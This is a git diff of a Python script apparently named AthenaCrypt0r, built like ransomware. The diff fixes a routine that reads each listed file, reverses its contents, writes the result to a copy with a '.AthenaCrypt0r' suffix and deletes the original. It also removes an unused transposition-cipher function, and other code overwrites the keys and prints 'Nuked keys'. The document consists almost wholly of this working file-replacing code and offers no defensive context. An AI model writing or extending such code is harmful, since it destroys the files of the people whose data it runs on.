@@ -32,8 +32,6 @@ def main(Pubkey, Privkey):
     # TODO: encryption
     reverseCryptor(files)
 
-
-
     # clear the key out of memory 
     for k in range(1000):
         Pubkey = r.randint(1,86400)
@@ -43,21 +41,17 @@ def main(Pubkey, Privkey):
     print("Nuked keys - new values are: \n"+ "Public Key: "+ str(Pubkey) + "\n" + "Private key: "+str(Privkey))
 
 
-def transpositionCryptor(key, files):
-        for file in files:
-            f = open(files, "w+")
-            encrypted = te.encryptMessage(key,f)
-            f.write(encrypted)
-
-
 def reverseCryptor(files):
     outputfile = ".AthenaCrypt0r"
     for file in files:
-        f = open(files)
+        f = open(file, "r")
         contents = f.read()
+        #print(contents)
         f.close()
+        os.remove(file)
         encrypted = rc.reverse(contents)
-        f1 = open(files+outputfile, "w")
+        #print(encrypted)
+        f1 = open(file+outputfile, "w")
         f1.write(encrypted)
         f1.close()
 
